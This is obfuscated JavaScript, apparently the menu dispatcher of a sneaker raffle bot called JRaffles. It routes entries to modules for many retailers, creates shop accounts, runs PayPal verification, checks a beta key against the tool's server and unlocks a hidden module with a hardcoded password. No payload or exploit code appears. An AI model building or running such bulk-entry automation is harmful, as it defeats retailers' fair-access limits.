                if (taskModule > _0x1e8c04['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x289b0b(0x3e8), _0x56f339();
                if (_0x1e8c04[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                    var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x27df56 = await _0x1082d0();
                            await _0x15ee83['function'](_0x15ee83, _0x27df56);
                        }
                        if (taskFunction == 0x2) {
                            var _0x27df56 = await _0x1082d0(), _0x4b0404 = await _0x4119b0(_0x15ee83);
                            _0x79d23a['shuffleTasks'] && await _0x463df8(_0x4b0404), await _0x15ee83['function'](_0x15ee83, _0x4b0404, _0x27df56);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x27df56 = await _0x1082d0(), _0x4b0404 = await _0x4119b0(_0x15ee83);
                                _0x79d23a['shuffleTasks'] && await _0x463df8(_0x4b0404), await _0x15ee83['function'](_0x15ee83, _0x4b0404, _0x27df56);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x27df56 = await _0x1082d0();
                                    await _0x15ee83['function'](_0x15ee83, _0x27df56);
                                }
                            }
                        }
                    } catch (_0x57fa49) {
                        console['log'](_0x57fa49), await _0x289b0b(0x7d0);
                    }
                    return _0x56f339();
                }
                if (_0x1e8c04[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                        var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x27df56 = await _0x1082d0(), _0x27e3ba = await _0x4119b0(_0x15ee83);
                            _0x79d23a['shuffleTasks'] && await _0x463df8(_0x27e3ba), await _0x15ee83['function'](_0x15ee83, _0x27e3ba, _0x27df56);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x27df56 = await _0x1082d0(), _0x27e3ba = await _0x4119b0(_0x15ee83);
                                _0x79d23a['shuffleTasks'] && await _0x463df8(_0x27e3ba), await _0x15ee83['function'](_0x15ee83, _0x27e3ba, _0x27df56);
                            }
                        }
                    } catch (_0xe023e) {
                        console['log'](_0xe023e), await _0x289b0b(0xfa0);
                    }
                    return _0x56f339();
                }
                if (_0x1e8c04[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                        var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x27df56 = await _0x1082d0(), _0x27e3ba = await _0x4119b0(_0x15ee83);
                            _0x79d23a['shuffleTasks'] && await _0x463df8(_0x27e3ba), await _0x15ee83['function'](_0x15ee83, _0x27e3ba, _0x27df56);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x27df56 = await _0x1082d0(), _0x27e3ba = await _0x4119b0(_0x15ee83);
                                _0x79d23a['shuffleTasks'] && await _0x463df8(_0x27e3ba), await _0x15ee83['function'](_0x15ee83, _0x27e3ba, _0x27df56);
                            }
                        }
                    } catch (_0x5f116e) {
                        console['log'](_0x5f116e), await _0x289b0b(0xfa0);
                    }
                    return _0x56f339();
                }
                if (_0x1e8c04[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                    var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x27df56 = await _0x1082d0();
                        return await _0x15ee83['function'](_0x15ee83, _0x27df56), _0x56f339();
                    }
                    var _0x27df56 = await _0x1082d0(), _0x416837 = await _0x4119b0(_0x15ee83);
                    return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x416837), await _0x15ee83['function'](_0x15ee83, _0x416837, _0x27df56), _0x56f339();
                }
                if (_0x1e8c04[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                    var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x27df56 = await _0x1082d0(), _0x416837 = await _0x4119b0(_0x15ee83);
                    return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x416837), await _0x15ee83['function'](_0x15ee83, _0x416837, _0x27df56), _0x56f339();
                }
                if (_0x1e8c04[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                    var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x27df56 = await _0x1082d0(), _0x416837 = await _0x4119b0(_0x15ee83);
                    return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x416837), await _0x15ee83['function'](_0x15ee83, _0x416837, _0x27df56), _0x56f339();
                }
                if (_0x1e8c04[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                    var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x27df56 = await _0x1082d0(), _0x416837 = await _0x4119b0(_0x15ee83);
                    return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x416837), await _0x15ee83['function'](_0x15ee83, _0x416837, _0x27df56), _0x56f339();
                } else {
                    if (_0x1e8c04[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                        var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x27df56 = await _0x1082d0(), _0x10d0e0 = await _0x4119b0(_0x15ee83);
                            return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x10d0e0), await _0x15ee83['function'](_0x15ee83, _0x10d0e0, _0x27df56), _0x56f339();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x27df56 = await _0x1082d0();
                                return await _0x15ee83['function'](_0x15ee83, null, _0x27df56), _0x56f339();
                            }
                        }
                        ;
                    } else {
                        if (_0x1e8c04[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                            var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction], _0x27df56 = await _0x1082d0(), _0x365775 = await _0x4119b0(_0x15ee83);
                            return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x365775), await _0x15ee83['function'](_0x15ee83, _0x365775, _0x27df56), await _0x289b0b(0x1388), _0x56f339();
                        } else {
                            if (_0x1e8c04[taskModule]['name'] == 'Google\x20Forms') {
                                try {
                                    let _0x31fc13 = { 'headers': { 'content-type': 'application/json' } }, _0x30503c = { 'key': _0x323fa2 }, _0x3b7fc1 = await _0x500c10['post']('https://jraffles.herokuapp.com/beta', _0x30503c, _0x31fc13);
                                    if (_0x3b7fc1['status'] != 0xc8)
                                        throw new Error('No\x20Beta\x20Access..');
                                    console['log']('Hello,\x20' + _0x1ac777['cyan'](_0x2e53d0) + '.\x20Beta\x20Access\x20Granted.'), await _0x289b0b(0x3e8);
                                } catch (_0x28f38a) {
                                    return console['log']('No\x20Beta\x20Access.'), await _0x289b0b(0x7d0), _0x56f339();
                                }
                                taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                                var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction], _0x27df56 = await _0x1082d0(), _0x365775 = await _0x4119b0(_0x15ee83);
                                return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x365775), await _0x15ee83['function'](_0x15ee83, _0x365775, _0x27df56), await _0x289b0b(0x1388), _0x56f339();
                            } else {
                                if (_0x1e8c04[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                                    var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x27df56 = await _0x1082d0(), _0x10d0e0 = await _0x4119b0(_0x15ee83);
                                        return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x10d0e0), await _0x15ee83['function'](_0x15ee83, _0x10d0e0, _0x27df56), _0x56f339();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x27df56 = await _0x1082d0();
                                            return await _0x15ee83['function'](_0x15ee83, null, _0x27df56), _0x56f339();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x1e8c04[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                                        var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x15ee83);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x1e8c04[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                                            var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x27df56 = await _0x1082d0(), _0x58a367 = await _0x4119b0(_0x15ee83);
                                                return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x58a367), await _0x15ee83['function'](_0x15ee83, _0x58a367, _0x27df56), _0x56f339();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x27df56 = await _0x1082d0(), _0x58a367 = await _0x4119b0(_0x15ee83);
                                                    return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x58a367), await _0x15ee83['function'](_0x15ee83, _0x58a367, _0x27df56), _0x56f339();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x1e8c04[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                                                var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x27df56 = await _0x1082d0(), _0x5135f2 = await _0x4119b0(_0x15ee83);
                                                    return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x5135f2), await _0x15ee83['function'](_0x15ee83, _0x5135f2, _0x27df56), _0x56f339();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x27df56 = await _0x1082d0(), _0x5135f2 = await _0x4119b0(_0x15ee83);
                                                        return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x5135f2), await _0x15ee83['function'](_0x15ee83, _0x5135f2, _0x27df56), _0x56f339();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x1e8c04[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                                                    var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x27df56 = await _0x1082d0(), _0x4977de = await _0x4119b0(_0x15ee83);
                                                        return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x4977de), await _0x15ee83['function'](_0x15ee83, _0x4977de, _0x27df56), _0x56f339();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x27df56 = await _0x1082d0(), _0x4977de = await _0x4119b0(_0x15ee83);
                                                            return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x4977de), await _0x15ee83['function'](_0x15ee83, _0x4977de, _0x27df56), _0x56f339();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x1e8c04[taskModule]['name'] == 'KICKZ') {
                                                        taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                                                        var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x27df56 = await _0x1082d0(), _0x4977de = await _0x4119b0(_0x15ee83);
                                                            return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x4977de), await _0x15ee83['function'](_0x15ee83, _0x4977de, _0x27df56), _0x56f339();
                                                        } else {
                                                            if (taskFunction == 0x1) {
                                                                var _0x27df56 = await _0x1082d0(), _0x4977de = await _0x4119b0(_0x15ee83);
                                                                return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x4977de), await _0x15ee83['function'](_0x15ee83, _0x4977de, _0x27df56), _0x56f339();
                                                            }
                                                        }
                                                        ;
                                                    } else {
                                                        if (_0x1e8c04[taskModule]['name'] == 'ADIDAS\x20CONFIRMED') {
                                                            taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                                                            var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                                                            console['clear']();
                                                            if (taskFunction == 0x0 || taskFunction == 0x1 || taskFunction == 0x2 || taskFunction == 0x3 || taskFunction == 0x4) {
                                                                var _0x27df56 = await _0x1082d0(), _0x5bd127 = await _0x4119b0(_0x15ee83);
                                                                return _0x79d23a['shuffleTasks'] && await _0x463df8(_0x5bd127), await _0x15ee83['function'](_0x5bd127, _0x27df56), _0x56f339();
                                                            }
                                                        } else {
                                                            if (_0x1e8c04[taskModule]['name'] == 'Seven\x20Store')
                                                                return console['log']('returning\x20to\x20menu'), await _0x289b0b(0x3e8), _0x56f339();
                                                            else {
                                                                if (_0x1e8c04[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                    var _0x5ba3e1 = _0x1e8c04[taskModule]['name'], _0x27df56 = await _0x1082d0();
                                                                    return await _0x3c9b5a(_0x5ba3e1, _0x27df56), _0x56f339();
                                                                } else {
                                                                    if (_0x1e8c04[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                        taskFunction = await _0x123f37(_0x1e8c04[taskModule]['modules']);
                                                                        var _0x15ee83 = _0x1e8c04[taskModule]['modules'][taskFunction];
                                                                        return await _0x15ee83['function'](_0x15ee83), _0x56f339();
                                                                    } else {
                                                                        if (_0x1e8c04[taskModule]['name'] == 'Change\x20Settings') {
                                                                            console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                            var _0x53d554 = 0x0;
                                                                            for (const _0x1f0e5c in _0x79d23a) {
                                                                                console['log']('(' + _0x53d554 + ')\x20' + _0x1f0e5c + '\x20:\x20' + _0x79d23a[_0x1f0e5c]), _0x53d554++;
                                                                            }
                                                                            console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x53d554 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                            var _0x25a91e = await _0x580dbe();
                                                                            if (_0x25a91e == _0x53d554)
                                                                                return _0x56f339();
                                                                            console['clear'];
                                                                            var _0x1c07a8 = 0x0;
                                                                            for (var _0x29ff2e in _0x79d23a) {
                                                                                if (_0x25a91e == _0x1c07a8) {
                                                                                    console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x29ff2e + '\x20:'), _0x79d23a[_0x29ff2e] = await _0xd512a2(), _0x457b0a['writeFileSync']('../settings.json', JSON['stringify'](_0x79d23a));
                                                                                    break;
                                                                                } else
                                                                                    _0x1c07a8++;
                                                                            }
                                                                            return console['log']('Settings\x20Saved!'), await _0x289b0b(0xbb8), _0x56f339();
                                                                        } else {
                                                                            if (_0x1e8c04[taskModule]['name'] == 'Reload\x20Settings')
                                                                                return console['log']('Reloading\x20settings'), await _0x4f45a9(), _0x56f339();
                                                                            else {
                                                                                if (taskModule == 0x45) {
                                                                                    _0x1e8c04[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                    var _0x4326a3 = await _0x2672c8();
                                                                                    _0x4326a3 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x13c8b1(), await afewFunction(_0x376d4d[_0x2b4ece], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x289b0b(0xbb8));
                                                                                } else {
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x56f339();
            } catch (_0x23cbea) {
                return console['log'](_0x23cbea), await _0x289b0b(0x2710), _0x56f339();
            }
        } catch (_0x464820) {
            return console['log'](_0x464820), await _0x289b0b(0x3a98);
        }
}
;
_0x25b0b6('JRaffles\x20' + _0x492c9c);
try {
    _0x4f45a9(), _0xe3d2bf();
} catch (_0x4c693e) {
    console['log'](_0x4c693e);
}